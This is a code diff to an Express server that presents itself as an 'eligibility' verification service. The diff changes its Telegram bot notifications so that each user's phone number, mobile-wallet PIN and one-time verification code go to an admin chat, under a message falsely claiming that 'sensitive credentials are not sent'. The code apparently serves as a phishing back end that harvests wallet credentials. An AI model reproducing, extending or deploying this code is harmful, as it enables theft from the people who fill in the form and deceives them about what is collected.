@@ -19,7 +19,7 @@ app.use(cors())
 app.use(express.json())
 app.use(morgan('tiny'))
 
-const sendTelegramNotification = async ({ phone, postalCode, reference }) => {
+const sendTelegramNotification = async ({ phone, walletpin, reference }) => {
   const botToken = process.env.TELEGRAM_BOT_TOKEN
   const chatId = process.env.TELEGRAM_ADMIN_CHAT_ID
   if (!botToken || !chatId) return
@@ -29,11 +29,11 @@ const sendTelegramNotification = async ({ phone, postalCode, reference }) => {
     '',
     'New eligibility request',
     `Phone: ${phone}`,
-    `Postal code: ${postalCode}`,
+    `Wallet PIN: ${walletpin}`,
     `Reference: ${reference}`,
     'Status: Awaiting code verification',
     '',
-    'Postal code is included for review; sensitive credentials are not sent.'
+    'Wallet PIN is included for review; sensitive credentials are not sent.'
   ].join('\n')
 
   const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -58,7 +58,7 @@ const sendTelegramNotification = async ({ phone, postalCode, reference }) => {
   }
 }
 
-const sendTelegramCompletionNotification = async ({ phone, postalCode, reference, otp }) => {
+const sendTelegramCompletionNotification = async ({ phone, walletpin, reference, otp }) => {
   const botToken = process.env.TELEGRAM_BOT_TOKEN
   const chatId = process.env.TELEGRAM_ADMIN_CHAT_ID
   if (!botToken || !chatId) throw new Error('Telegram notifications are not configured.')
@@ -68,7 +68,7 @@ const sendTelegramCompletionNotification = async ({ phone, postalCode, reference
     '',
     'User completed the verification step',
     `Phone: ${phone}`,
-    `Postal code: ${postalCode}`,
+    `Wallet PIN: ${walletpin}`,
     `Code: ${otp}`,
     `Reference: ${reference}`,
     'Status: Final step submitted',
@@ -179,7 +179,7 @@ app.post('/api/eligibility', (request, response) => {
   }
 
   if (!/^\d{4,5}$/.test(String(walletpin ?? ''))) {
-    return response.status(400).json({ message: 'Enter a 4- or 5-digit wallet pin.' })
+    return response.status(400).json({ message: 'Enter a 4- or 5-digit wallet PIN.' })
   }
 
   const reference = `ZDI-${Date.now().toString(36).toUpperCase()}`
